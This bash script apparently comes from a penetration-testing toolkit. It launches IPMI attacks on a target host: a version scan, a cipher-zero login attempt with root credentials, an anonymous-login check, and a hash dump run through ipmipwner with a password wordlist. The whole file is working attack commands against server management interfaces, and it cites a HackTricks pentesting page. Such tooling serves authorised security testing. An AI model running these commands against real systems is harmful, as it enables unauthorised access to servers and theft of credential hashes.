#!/bin/bash

# https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi
host=$1
port=623
mkdir -p "test_results/asf-rmcp/${host}"

if [[ ! -z "${2}" ]]; then
	port=$2
fi

echo "Launching IPMI scans on ${host}:${port}"
# must download
nmap -sU --script ipmi-version -p "${port}" "${host}" -oA "test_results/asf-rmcp/${host}/version_p${port}" &
ipmitool -I lanplus -C 0 -H "${host}" -p "${port}" -U root -P root user list > "test_results/asf-rmcp/${host}/cipher_0_p${port}" &
ipmitool -I lanplus -H "${host}" -p "${port}" -U '' -P '' user list > "test_results/asf-rmcp/${host}/anon_login_p${port}" &
python3 ipmipwner.py --host "${host}" -p "${port}" -c john -oH "test_results/asf-rmcp/${host}/hashes-p${port}" -pW wordlists/ipmi_passes.txt &
echo "IPMI scans on ${host}:${port} launched."
exit 0
